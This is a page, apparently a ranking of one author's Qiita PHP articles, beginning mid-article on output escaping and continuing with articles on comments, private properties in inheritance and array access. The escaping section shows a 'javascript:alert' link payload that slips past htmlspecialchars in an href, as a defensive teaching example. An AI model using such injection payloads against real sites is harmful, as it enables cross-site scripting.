<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">h</span><span class="p">(</span><span class="s2">"javascript:alert('Test')"</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="s">"</span><span class="p">&gt;</span>Test<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"javascript:alert('Test')"</span><span class="p">&gt;</span>Test<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</pre></div>
</div>

<p>完全に防ぐには、(チェックを行わないまま)<ins>属性値にユーザー入力を展開してはいけない</ins>という制約を設ける必要があります。</p>

<h1>
<span id="次回以降に向けて" class="fragment"></span><a href="#%E6%AC%A1%E5%9B%9E%E4%BB%A5%E9%99%8D%E3%81%AB%E5%90%91%E3%81%91%E3%81%A6"><i class="fa fa-link"></i></a>次回以降に向けて</h1>

<h2>
<span id="h-関数は最後の-echo-と同時に" class="fragment"></span><a href="#h-%E9%96%A2%E6%95%B0%E3%81%AF%E6%9C%80%E5%BE%8C%E3%81%AE-echo-%E3%81%A8%E5%90%8C%E6%99%82%E3%81%AB"><i class="fa fa-link"></i></a><code>h</code> 関数は最後の <code>echo</code> と同時に</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nx">h</span><span class="p">(</span><span class="nv">$var</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&lt;/div&gt;</span>
</pre></div></div>

<p>エスケープを実行するのは最後に <code>echo</code> して値を表示すると同時にしてください。(例外もありますが)<ins>あらかじめエスケープしておいて変数に保存する</ins>のは可能な限りやめてください。なぜなら <strong>「この変数ってエスケープ済みだっけ・・・？」</strong> という余分なことを考える必要が発生してしまうからです。</p>

<p>実は、上記のコードのように1つのPHPタグ区間内に文が1つしかない場合、末尾のセミコロンを省略して</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">h</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div></div>

<p>とすることが出来ます。更にPHP5.4以降であれば、この形を</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div></div>

<p>として短縮することが出来ます。 これを <strong>echo短縮構文</strong> といいます。<code>&lt;?php=h($var)?&gt;</code> ではないことに注意してください。次回以降はこれが使えるところはこの方法で記述していきます。</p>

<h2>
<span id="必要に応じてコメントを入れる" class="fragment"></span><a href="#%E5%BF%85%E8%A6%81%E3%81%AB%E5%BF%9C%E3%81%98%E3%81%A6%E3%82%B3%E3%83%A1%E3%83%B3%E3%83%88%E3%82%92%E5%85%A5%E3%82%8C%E3%82%8B"><i class="fa fa-link"></i></a>必要に応じてコメントを入れる</h2>

<p>プログラミングにおいて、「明日の自分は自分ではない」ということがよく言われます。これは、<ins>今自分が書いたコードを明日の自分が理解できる保証はない</ins>ということを意味しているのです。そこでコメントを使って未来の自分が理解するための手がかりを今のうちに残しておく癖をつけましょう。</p>

<p>PHPには3種類のコメント記述が用意されています。</p>

<ul>
<li>
<code>//</code> 1行指定</li>
<li>
<code>#</code> 1行指定</li>
<li>
<code>/*</code> ～ <code>*/</code> 複数行指定</li>
</ul>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="c1">// 1回目</span>
<span class="k">echo</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// 1+1を計算する！</span>

<span class="c1"># 2回目</span>
<span class="k">echo</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">2</span> <span class="c1"># 1+2を計算する！</span>

<span class="cm">/* </span>
<span class="cm">// 3回目</span>
<span class="cm">echo 1 + 3; // 1+3を計算する！</span>
<span class="cm">*/</span>
</pre></div></div>

<p>この例では3回目のための記述を丸ごとコメント化しています。このように一時的にコメント化してコードを無効にすることを <strong>「コメントアウトする」</strong> といいます。</p>

<p>関数などのためのコメントには</p>

<ul>
<li>
<code>/**</code> ～ <code>*/</code> 複数行指定</li>
</ul>

<p>という形式がよく用いられます。単に先ほどの例で先頭の <code>*</code> を1つ増やしただけですが、このQiitaを含め、多くのソースコード整形表示ツールでは専用の色が適用されて表示されます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="sd">/**</span>
<span class="sd"> * HTML特殊文字をエスケープする関数</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p><strong><a href="http://blog.flavacube.com/2010/04/%E3%80%90phpdoc%E3%80%91%E3%82%B3%E3%83%A1%E3%83%B3%E3%83%88%E3%81%AE%E6%9B%B8%E3%81%8D%E6%96%B9%E3%81%AE%E3%81%BE%E3%81%A8%E3%82%81/" rel="nofollow noopener" target="_blank">PhpDoc</a></strong> という特別な書き方も存在します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="sd">/**</span>
<span class="sd"> * HTML特殊文字をエスケープする関数</span>
<span class="sd"> * </span>
<span class="sd"> * @param $str 対象の文字列</span>
<span class="sd"> * @return 処理された文字列 </span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />13位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>89</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/1cb6fc8170b6a8c8eb04">[PHP] そのプロパティ、privateに出来ませんか？</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-01-21 06:02:29</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[オブジェクト指向]</b> <b>[クラス]</b> <b>[oop]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="前書き" class="fragment"></span><a href="#%E5%89%8D%E6%9B%B8%E3%81%8D"><i class="fa fa-link"></i></a>前書き</h1>

<p>最初に言っておきます、<ins>オブジェクト指向をちゃんと理解している人は読む必要のない記事</ins>です。おぼろげにしか理解していない人のために、またつい最近までちゃんと理解していなかった自分へのメモのために書きます。</p>

<ul>
<li>プロパティは全て <strong>private</strong> が当たり前だと思っている人は読まなくていいです。</li>
<li>プロパティは全て <strong>public</strong> が当たり前だと思っている人はもうちょっとクラスの継承・カプセル化について勉強してから読みに来てください。</li>
</ul>

<p><ins>2014/11/25 タイトル変更</ins><br><strong>コメント欄の<a href="/xipx" class="user-mention js-hovercard" title="xipx" data-hovercard-target-type="user" data-hovercard-target-name="xipx">@xipx</a>さんの指摘、ならびにそれに対する私の回答を併せてご覧ください。</strong></p>

<h1>
<span id="問題" class="fragment"></span><a href="#%E5%95%8F%E9%A1%8C"><i class="fa fa-link"></i></a>問題</h1>

<h2>
<span id="外部からのアクセスに対してアクセス修飾子が持つ意味" class="fragment"></span><a href="#%E5%A4%96%E9%83%A8%E3%81%8B%E3%82%89%E3%81%AE%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%AB%E5%AF%BE%E3%81%97%E3%81%A6%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E4%BF%AE%E9%A3%BE%E5%AD%90%E3%81%8C%E6%8C%81%E3%81%A4%E6%84%8F%E5%91%B3"><i class="fa fa-link"></i></a>外部からのアクセスに対してアクセス修飾子が持つ意味</h2>

<p>「プロパティは全部 <strong>private</strong> が当たり前だ！」とは言いましたが、当然 <strong>「継承するときどうするの？」</strong> って思いますよね。ここで例を示します。文字列のみをプロパティとして格納することを許可されたクラスです。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">Wordクラス</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Word</span> <span class="p">{</span>

    <span class="k">protected</span> <span class="nv">$word</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">setWord</span><span class="p">(</span><span class="nv">$word</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$word</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">'invalid argument variable type'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">word</span> <span class="o">=</span> <span class="nv">$word</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getWord</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">word</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>
</div>

<p>こういうコードを書いてる方、多いんじゃないでしょうか。ゲッターとセッターを用意することで外部から</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Word</span><span class="p">;</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">word</span> <span class="o">=</span> <span class="s1">'hoge'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">word</span><span class="p">;</span>
</pre></div></div>

<p>のようなアクセスは出来ないようにし、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Word</span><span class="p">;</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">setWord</span><span class="p">(</span><span class="s1">'hoge'</span><span class="p">);</span>
<span class="k">echo</span> <span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">getWord</span><span class="p">();</span>
</pre></div></div>

<p>という方法を代わりに提供する手段です。こうすることで、文字列ではないものをセットしようとしたときに例外を発生させることが出来ます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Word</span><span class="p">;</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">word</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="k">echo</span> <span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">word</span><span class="p">;</span> <span class="c1">// Notice: Array to string conversion が発生してしまう</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Word</span><span class="p">;</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">setWord</span><span class="p">(</span><span class="k">array</span><span class="p">());</span> <span class="c1">// この段階で例外がスローされる</span>
<span class="k">echo</span> <span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">getWord</span><span class="p">();</span>
</pre></div></div>

<p>ところが・・・</p>

<h2>
<span id="継承先のクラスからのアクセスに対してアクセス修飾子が持つ意味" class="fragment"></span><a href="#%E7%B6%99%E6%89%BF%E5%85%88%E3%81%AE%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%8B%E3%82%89%E3%81%AE%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%AB%E5%AF%BE%E3%81%97%E3%81%A6%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E4%BF%AE%E9%A3%BE%E5%AD%90%E3%81%8C%E6%8C%81%E3%81%A4%E6%84%8F%E5%91%B3"><i class="fa fa-link"></i></a>継承先のクラスからのアクセスに対してアクセス修飾子が持つ意味</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">Wordクラス</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Word</span> <span class="p">{</span>

    <span class="k">protected</span> <span class="nv">$word</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">setWord</span><span class="p">(</span><span class="nv">$word</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$word</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">'invalid argument variable type'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">word</span> <span class="o">=</span> <span class="nv">$word</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getWord</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">word</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">MyWordクラス</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">MyWord</span> <span class="k">extends</span> <span class="nx">Word</span> <span class="p">{</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">setWord</span><span class="p">(</span><span class="nv">$word</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">word</span> <span class="o">=</span> <span class="nv">$word</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>
</div>

<p>このようにノーチェックでセットするようにオーバーライドしたとします。すると、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Word</span><span class="p">;</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">setWord</span><span class="p">(</span><span class="k">array</span><span class="p">());</span>
<span class="k">echo</span> <span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">getWord</span><span class="p">();</span> <span class="c1">// Notice: Array to string conversion が発生してしまう</span>
</pre></div></div>

<p>のようにエラーが発生してしまいます。<code>Word::getWord()</code> メソッドは <code>$this-&gt;word</code> が文字列であることが前提で書かれたメソッドであり、継承先のクラスでそのルールを破った代入を行ってしまったため、このような結果になってしまったのです。</p>

<h1>
<span id="解決策" class="fragment"></span><a href="#%E8%A7%A3%E6%B1%BA%E7%AD%96"><i class="fa fa-link"></i></a>解決策</h1>

<p>こういった問題を防ぐためにどうするかを考えましょう。</p>

<h2>
<span id="プロパティの前にアンダースコアをつける" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%83%91%E3%83%86%E3%82%A3%E3%81%AE%E5%89%8D%E3%81%AB%E3%82%A2%E3%83%B3%E3%83%80%E3%83%BC%E3%82%B9%E3%82%B3%E3%82%A2%E3%82%92%E3%81%A4%E3%81%91%E3%82%8B"><i class="fa fa-link"></i></a>プロパティの前にアンダースコアをつける</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">Wordクラス</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Word</span> <span class="p">{</span>

    <span class="k">protected</span> <span class="nv">$_word</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">setWord</span><span class="p">(</span><span class="nv">$word</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$word</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">'invalid argument variable type'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_word</span> <span class="o">=</span> <span class="nv">$word</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getWord</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_word</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>
</div>

<p>親クラスでアンダースコアを付加して書いておき、 <strong>「継承先でアンダースコアから始まるプロパティには勝手に触れないでね！」</strong> というオレオレルールに従わせるという発想です。しかし、これでは</p>

<p><a href="https://camo.qiitausercontent.com/1647e1535ceb4878725dd0e99df4790bcbe0d778/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f34663764326530662d353466342d643266612d326234312d6433316433383863366433652e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/1647e1535ceb4878725dd0e99df4790bcbe0d778/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f34663764326530662d353466342d643266612d326234312d6433316433383863366433652e6a706567" alt="「そんなの関係ねぇ!」" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/4f7d2e0f-54f4-d2fa-2b41-d31d388c6d3e.jpeg"></a></p>

<p>こういう考えの人が</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">MyWordクラス</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">MyWord</span> <span class="k">extends</span> <span class="nx">Word</span> <span class="p">{</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">setWord</span><span class="p">(</span><span class="nv">$word</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_word</span> <span class="o">=</span> <span class="nv">$word</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>
</div>

<p>なんて書いちゃうかもしれませんよね。根本的な解決策にはなってないということです。</p>

<h2>
<span id="プロパティを-private-にする" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%83%91%E3%83%86%E3%82%A3%E3%82%92-private-%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>プロパティを <strong>private</strong> にする</h2>

<p>実は、<ins>継承先で使う場合でも private にすることは可能</ins>なんです。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">Wordクラス</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Word</span> <span class="p">{</span>

    <span class="k">private</span> <span class="nv">$word</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">setWord</span><span class="p">(</span><span class="nv">$word</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$word</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">'invalid argument variable type'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">word</span> <span class="o">=</span> <span class="nv">$word</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getWord</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">word</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>
</div>

<p>こうしておけば</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">MyWordクラス</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">MyWord</span> <span class="k">extends</span> <span class="nx">Word</span> <span class="p">{</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">setWord</span><span class="p">(</span><span class="nv">$word</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">word</span> <span class="o">=</span> <span class="nv">$word</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MyWord</span><span class="p">;</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">setWord</span><span class="p">(</span><span class="k">array</span><span class="p">());</span>
</pre></div></div>

<p>とされても、<code>$obj-&gt;getWord()</code> で得られるもの、つまり <ins>Word クラスで</ins> <strong><code>private $word;</code></strong> <ins>と宣言したものには影響を及ぼしません</ins>。では実際に何に対する代入が行われたのかというと…</p>

<p><strong>MyWord</strong> クラスの <strong><code>public $word;</code></strong> が該当します。</p>

<p><strong>「そんな記述ないじゃないか！」</strong> と突っ込みたくなるかもしれませんが、<ins>PHPでは未定義のインスタンスプロパティに対して暗黙的に public で代入することが出来る</ins>ので、こういった挙動になるわけです。もちろんJava等であればエラー・例外が発生します。</p>

<p>しかし、これでは</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MyWord</span><span class="p">;</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">setWord</span><span class="p">(</span><span class="s1">'hoge'</span><span class="p">);</span>
</pre></div></div>

<p>という正しい代入を行ったとしても、 <code>$obj-&gt;getWord()</code> で得られるものは変化してくれません。そこで、 <strong>parentキーワード</strong> を使って親クラスのメソッドを呼び出すことにします。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">MyWordクラス</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">MyWord</span> <span class="k">extends</span> <span class="nx">Word</span> <span class="p">{</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">setWord</span><span class="p">(</span><span class="nv">$word</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">parent</span><span class="o">::</span><span class="na">setWord</span><span class="p">(</span><span class="nv">$word</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>
</div>

<p>こうしておけば、文字列であるかどうかのチェックを行った上で <ins>Word クラスで</ins> <strong><code>private $word;</code></strong> <ins>と宣言したもの</ins> に代入することが出来ます。プロパティ自体は <strong>private</strong> ですが、親クラスの <code>setWord</code> メソッドを通じてならばアクセスすることが可能になるからです。</p>

<h3>
<span id="追記" class="fragment"></span><a href="#%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>追記</h3>

<p>（あくまで <strong>private</strong> を活用したデザインパターン例として説明したかったのですが）コメント欄で <strong>「継承メソッドを作らずにそのまま使えばいいだけじゃない？」</strong> という指摘を頂きました。こうするメリットを明確にしたいならば</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">MyWordクラス</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">MyWord</span> <span class="k">extends</span> <span class="nx">Word</span> <span class="p">{</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">setDateTime</span><span class="p">(</span><span class="nx">DateTime</span> <span class="nv">$date</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">parent</span><span class="o">::</span><span class="na">setWord</span><span class="p">(</span><span class="nv">$date</span><span class="o">-&gt;</span><span class="na">format</span><span class="p">(</span><span class="s1">'Y-m-d H:i:s'</span><span class="p">));</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>
</div>

<p>なんてものを作ってみてもいいかもしれませんね。この場合はメソッドのオーバーライドを行っていないので</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">MyWordクラス</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">MyWord</span> <span class="k">extends</span> <span class="nx">Word</span> <span class="p">{</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">setDateTime</span><span class="p">(</span><span class="nx">DateTime</span> <span class="nv">$date</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setWord</span><span class="p">(</span><span class="nv">$date</span><span class="o">-&gt;</span><span class="na">format</span><span class="p">(</span><span class="s1">'Y-m-d H:i:s'</span><span class="p">));</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>
</div>

<p>とすることも出来ます。</p>

<h1>
<span id="結論" class="fragment"></span><a href="#%E7%B5%90%E8%AB%96"><i class="fa fa-link"></i></a>結論</h1>

<p><strong>private</strong> をうまく活用すれば、アンダースコアで <strong>protected</strong> を表現する構成にする必要がなくなります。</p>

<p>オブジェクト指向(OOP)を正しく理解して、美しいコーディングを心がけましょう。</p>

<h3>
<span id="opp" class="fragment"></span><a href="#opp"><i class="fa fa-link"></i></a><del>OPP↓</del>
</h3>

<p><a href="https://camo.qiitausercontent.com/fe0e61d2a0ee3b1805ade80cc4cb757f4877989c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f62346635643834662d366466302d353337632d616235312d3038633932616231336361342e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/fe0e61d2a0ee3b1805ade80cc4cb757f4877989c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f62346635643834662d366466302d353337632d616235312d3038633932616231336361342e6a706567" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/b4f5d84f-6df0-537c-ab51-08c92ab13ca4.jpeg"></a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />14位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>80</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/2f75091579546e416069">連想配列のn番目の要素を取り出す</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-08-31 13:39:25</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="n番目のキーと値がペアになった部分配列で欲しい場合" class="fragment"></span><a href="#n%E7%95%AA%E7%9B%AE%E3%81%AE%E3%82%AD%E3%83%BC%E3%81%A8%E5%80%A4%E3%81%8C%E3%83%9A%E3%82%A2%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F%E9%83%A8%E5%88%86%E9%85%8D%E5%88%97%E3%81%A7%E6%AC%B2%E3%81%97%E3%81%84%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a><code>$n</code>番目のキーと値がペアになった部分配列で欲しい場合</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="nb">array_slice</span><span class="p">(</span><span class="nv">$arr</span><span class="p">,</span> <span class="nv">$n</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">true</span><span class="p">));</span>
</pre></div></div>

<h2>
<span id="n番目のキーだけ欲しい場合" class="fragment"></span><a href="#n%E7%95%AA%E7%9B%AE%E3%81%AE%E3%82%AD%E3%83%BC%E3%81%A0%E3%81%91%E6%AC%B2%E3%81%97%E3%81%84%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a><code>$n</code>番目のキーだけ欲しい場合</h2>

